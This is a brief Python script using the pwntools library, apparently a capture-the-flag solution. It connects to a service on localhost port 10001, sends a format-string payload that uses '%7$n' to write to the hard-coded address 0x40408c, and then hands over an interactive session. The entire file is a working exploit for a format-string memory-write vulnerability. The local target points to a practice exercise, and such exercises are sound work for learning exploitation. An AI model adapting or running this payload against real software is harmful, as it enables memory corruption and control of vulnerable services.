from pwn import *


p=remote("localhost",10001)

p.sendline(b"a"*4+b"%7$n"+p64(0x40408c))

p.interactive()